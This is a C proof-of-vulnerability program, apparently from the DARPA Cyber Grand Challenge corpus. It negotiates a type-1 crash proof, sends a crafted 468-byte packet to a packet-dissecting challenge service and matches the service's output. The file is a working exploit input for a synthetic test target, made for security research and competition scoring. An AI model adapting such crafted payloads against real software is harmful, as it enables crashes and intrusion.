#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd4\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbc\x01\x00\x00\xb4\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb4\x01\x00\x00"
         "\xcb\x8a\xbf\x79\xc7\xf9\x24\x70\x3e\x41\x8d\xfe\x27\xa2\xc6\x3a"
         "\xbd\xaa\xbc\x15\x51\x00\x00\x00\x01\x00\x44\x01\x90\x01\xfc\x41"
         "\x00\x55\xec\x0f\x4f\x23\x7f\xcf\x6a\x85\xa3\x87\x94\x64\xee\x60"
         "\x1f\x8b\x01\x00\x83\x84\xdf\xf8\x90\x4e\xf2\x8a\x8e\x89\xb3\x09"
         "\xf0\xb2\x89\x6a\x74\x15\x90\x46\x1b\x01\x00\xf2\xb2\x42\x78\xd4"
         "\x1c\x84\x1a\x82\x01\xe6\x0d\x35\x8b\xb4\x01\x00\x4a\xca\x57\x3b"
         "\xa6\x47\xb7\x25\xa6\x01\x00\xcc\xa7\x27\xf9\xa8\xa0\x03\x29\x30"
         "\x67\x0e\x60\xee\x81\xf4\x01\x00\xbc\x64\x70\xdc\xbf\x01\x00\x21"
         "\xe6\x7a\x0c\x21\x01\x00\x79\x74\xc5\xe3\x66\x9f\x30\xe2\x98\xdc"
         "\xa5\x17\x41\x00\x01\x00\x65\xff\x0a\x19\xa8\xa7\xa4\x58\x88\xe8"
         "\x3a\xe7\xb4\xf2\xcd\x01\xb5\x80\x08\x8e\x87\xe0\xeb\xe8\x48\x16"
         "\x4d\x08\x9c\x54\x2c\xd7\x58\x40\x7d\x61\x6e\xf2\x25\x4c\xcd\xe2"
         "\x29\xb5\xc2\x0b\xc9\x84\x55\xb0\x8b\x2c\x28\xe1\xa6\x9f\x98\xf9"
         "\x33\xa5\xfd\xfb\x3d\x01\x71\xa1\xf8\xfa\x58\xe7\x3a\xac\x7b\x5a"
         "\xd2\xcf\x78\x74\xfe\x62\x1e\xb7\x1f\xf9\xed\xd8\x7e\x39\x13\xd6"
         "\x67\xdb\x35\x38\x71\xc9\x63\xb6\xfe\xb3\x9d\x21\x5e\x42\xd1\x74"
         "\xbd\x6e\xa4\x95\xcb\xbd\x47\xcc\xc7\xe2\xbd\x79\xf0\x2e\x46\xb6"
         "\x0e\xf3\x6e\x0f\xf9\xd5\xce\x1d\x67\x16\xe6\x73\x94\x85\x93\x92"
         "\x2d\xe5\x1f\x96\x17\x0c\x7b\x66\xb4\x39\xf0\x4e\xf4\x51\x7a\x2c"
         "\xbe\xcb\xae\x1a\x1f\x57\x49\x22\x8e\x98\x37\xe2\x29\xab\xe6\xe4"
         "\xae\xb6\x24\x4f\x84\x78\xa5\x2e\x73\xbf\xfe\x70\xa5\xa1\x20\x65"
         "\x66\x68\xa5\xd0\x49\x7d\x0c\x90\x39\x31\xc0\xa1\x27\xd9\xf2\x53"
         "\x68\x10\x70\x24\x87\x90\x31\x33\xa7\x35\x04\x72\x03\x79\xfa\x3d"
         "\xca\x04\xb6\xa5\x67\xc7\x4b\x35\xe1\xe4\x15\xe2\x85\x83\x19\x3e"
         "\xdf\x98\xa4\xcd\xd5\xf7\x88\x21\x63\xfd\x90\x20\x4a\x60\xdb\xbb"
         "\xc8\x8b\x92\xec\xf0\xab\x97\x74\x2b\x01\x00\xe2\x82\x67\xd5\xd3"
         "\xa7\x50\x23\xac\x58\x7e\xa3\x46\x5d\xdf\xb7\x7d\xdc\xfa\x3d\x4c"
         "\xd2\xc8\x41\x00";
      static unsigned int write_00001_00000_len = 468;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasmolt
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x6d\x6f\x6c\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
